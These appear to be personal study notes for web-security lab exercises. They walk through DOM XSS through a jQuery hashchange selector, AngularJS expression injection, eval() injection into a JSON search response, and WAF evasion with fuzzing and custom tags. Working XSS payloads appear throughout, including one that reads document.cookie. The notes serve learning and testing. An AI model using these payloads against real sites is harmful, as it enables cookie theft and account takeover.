# JQuery function to manage hashchange events (JQuery selector)
```html
<script>
    $(window).on('hashchange', function(){
        var post = $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')');
        if (post) post.get(0).scrollIntoView();
    });
</script>
```

```html
var post = $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')');
if (post) post.get(0).scrollIntoView();
```

At the bove line we have a jquery selector (```$()```) and then there is an if which checks that the selector has return something. 

This is the problem.

We can check it in the web browser console tab:
```js
var post = $('section.blog-list h2:contains(Procrastination)')

post.get(0)
```

And we can see the DOM element exposed.

If we do the same with a blog post that doesn't exists on the blog we can see something strange:
```js
var post = $('section.blog-list h2:contains(Protition)')

post
```

We can see that the variable "post" contains in each case something (so the if showned before will failed). So the variable isn't null but contains informations such as length 0 because there isn't matches.

If we input HTML tags intead a tag this is what will happen:

```js
var post = $('section.blog-list h2:contains(<h1>test</h1>)')

post

post.get(0)
```

We will see that the response will be that the variable exists and that **the length is 1**.

In other words, this JQuery selector if receive a tag HTML creates a DOM element.
This element isn't putted inside the web pages because this **element is detached DOM element**.

We can attach it to the page. So we can assign a parent node to it from the page. Example:

```js
var mynode = document.getElementById('academyLabHeader')

mynode.appendChild(post)
```
**In this example we have atached an arbitrary DOM element to the DOM of the page. This element in this example contains a title ```<h1>``` but it can be everything**.


Exploit:

```js
<img src="0x0x" onerror=alert('XSS')>
```

An we will pass this exploit after the "#” in the URL. 

We can share it by sending the url putting it inside an ```<iframe>```:

```html
<iframe src="WEBPAGEURL/#"> onload="this.src+='<img src=0 onerror=print()'"></iframe>
```


# DOM XSS in AngularJS

JavScript's frameworks sometimes evaluate expressions contained in ```{{ }}```. So, in a webpage we can try to input something like: ```{{ 1 + 1}}```.


Malicious payload:
```js
{{ $eval.constructor('alert()')()}}
```

Basic angular HTML page:

```html
<!DOCTYPE html>
<html>
    <head>
        <script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.8.2/angular.min.js"></script>
    </head>

    <body ng-app="myApp" ng-controller="myCtrl">
        {{firstName}}
        {{ 1+1 }}
    </body>

    <script>
        var app = angular.module('myApp', []);
        app.controller('myctrl', function($scope){
            $scope.firstName = 'Adam';
        });
    </script>
</html>
```

If we load the above HTML page we see 'Adam' 2 as we expected because the two values are interpreted.

So if we add the maliciuos payload we will see that an alert event will be triggered.

The "constructor" function is a JS function wich dinamically creates other functions.

```html
<!DOCTYPE html>
<html>
    <head>
        <script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.8.2/angular.min.js"></script>
    </head>

    <body ng-app="myApp" ng-controller="myCtrl">
        {{firstName}}
        {{ 1+1 }}
    </body>

    <script>

        let test = Function('alert()');
        test();

        var app = angular.module('myApp', []);
        app.controller('myctrl', function($scope){
            $scope.firstName = 'Adam';
        });
    </script>
</html>
```

In the above code we will see that we created a function that inside recall an ```alert()``` function. Then we execute it by recalling the variable "test". 
If we don't assign the Function constructor to a variable **it remains an anonymous function**, but we can create it and immidiatly recall it by writing: ```Function('alert()') ();```.

Why our malicious payload is ```$eval.constructor```?

A constructor is a function executed when an instance of a class is created. By default if we create function ```test(){ console.log('hello world);}``` we have create an object that by inerithance have inerhit the constructor attribute. So this is **a reference to the constructor that have created that object and this is, also, a reference to the Function() function**. So when we write:
```js
{{ $eval.constructor('alert()')()}}
```

we are writing:
```js
{{ Function('alert()') ();}}
```
**In other words we are creating and executing a function that execute an alert**.


# Use of eval() function in JS, DOM XSS

We have a search box. If we post an unique string inside it like "stotestando" we notice that this string is written inside an ```<h1>``` element in the DOM.
This means that there is a JS functino that is writing this value inside the DOM.

By checking the source code of the web page we found that there is the following JS code:

```js
function search(path) {
    var xhr = new XMLHttpRequest();
    xhr.onreadystatechange = function() {
        if (this.readyState == 4 && this.status == 200) {
            eval('var searchResultsObj = ' + this.responseText);
            displaySearchResults(searchResultsObj);
        }
    };
    xhr.open("GET", path + window.location.search);
    xhr.send();

    function displaySearchResults(searchResultsObj) {
        var blogHeader = document.getElementsByClassName("blog-header")[0];
        var blogList = document.getElementsByClassName("blog-list")[0];
        var searchTerm = searchResultsObj.searchTerm
        var searchResults = searchResultsObj.results

        var h1 = document.createElement("h1");
        h1.innerText = searchResults.length + " search results for '" + searchTerm + "'";
        blogHeader.appendChild(h1);
        var hr = document.createElement("hr");
        blogHeader.appendChild(hr)

        for (var i = 0; i < searchResults.length; ++i)
        {
            var searchResult = searchResults[i];
            if (searchResult.id) {
                var blogLink = document.createElement("a");
                blogLink.setAttribute("href", "/post?postId=" + searchResult.id);

                if (searchResult.headerImage) {
                    var headerImage = document.createElement("img");
                    headerImage.setAttribute("src", "/image/" + searchResult.headerImage);
                    blogLink.appendChild(headerImage);
                }

                blogList.appendChild(blogLink);
            }

            blogList.innerHTML += "<br/>";

            if (searchResult.title) {
                var title = document.createElement("h2");
                title.innerText = searchResult.title;
                blogList.appendChild(title);
            }

            if (searchResult.summary) {
                var summary = document.createElement("p");
                summary.innerText = searchResult.summary;
                blogList.appendChild(summary);
            }

            if (searchResult.id) {
                var viewPostButton = document.createElement("a");
                viewPostButton.setAttribute("class", "button is-small");
                viewPostButton.setAttribute("href", "/post?postId=" + searchResult.id);
                viewPostButton.innerText = "View post";
            }
        }

        var linkback = document.createElement("div");
        linkback.setAttribute("class", "is-linkback");
        var backToBlog = document.createElement("a");
        backToBlog.setAttribute("href", "/");
        backToBlog.innerText = "Back to Blog";
        linkback.appendChild(backToBlog);
        blogList.appendChild(linkback);
    }
}
```

We can notice that there is the following line:
```js
eval('var searchResultsObj = ' + this.responseText);
```


- this.responseText contains the incoming response from the contacted API;
- Analyzing the call flow from the browser's "network" tab, we see that a call is made to "/search-results?search=stotestando". It means that an endpoint API is contacted with a "search" parameter;
- Looking at the response you can see that a json has been returned which is:
    ```json
    {"results":[],"searchTerm":"stotestando"}
    ```
- This JSON will end up inside "this.responseText" as a string. So when the vulnerable line is executed you will have:
    ```js
    eval('var searchResultsObj = ' + '{"results":[],"searchTerm":"stotestando"}'
    ```
- The attacker could pass as a search term: ```"};alert('xss')//```;
- In this way the result will be:
    ```js
    eval('var searchResultsObj = ' + '{"results":[],"searchTerm":""};alert('xss')//"}'
    ```

**So, the attacker closes the JSON which will then be assigned to searchResultsObj and then at the code level a new variable will be instantiated which will be a JSON composed of an array and a searchTerm parameter which is an empty string. After that an alert will be executed and then the XSS and with the double slash the non-useful characters are commented out**.

N.B.: In case there is escaping of characters (for example " are rewritten as \") just apply a double escaping so that the escaping character is also escaped.

The ```eval()``` function executes code, while using ```json.parse()``` is safer because if it does not receive a valid json it throws an exception.

# Bypass WAF protection in reflected XSS

If there is a WAF which blocks some tags and/or some events, we can fuzz with the Burp'intruders the ones allowed:
- We can intercept the blocked request;
- Send it to the intruder;
- Write: ```<$$>``` and put as a payload the list of tags from the **PortSwigger's XSS cheat sheet**;
- If also some events are blocked, do the same thing using the list of evets contained in the same reference.

If you need to work with ```iframes```, for example, in order to be able to trigger an ```onresize``` event, the following is an example:

```html
<iframe src="https://URL/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>
```

## Custom tags option to evade WAF

```html
/?search=<custom-tag id='x' onfocus='alert(document.cookie)' tabindex=1></custom-tag>#x
```

In order to automate the execution of the alert we can use the "onfocus event". If we assign an ID to our custom element, we can recall it by passing the hash to the URL QUERY. The problem is that an element recalled by the hashchange is not automatically "on focus". So if we set the "tabindex" parameter to 1, this element will be focused for first. If the user, then, click the tab on the keyboard will navigate other element of the page.

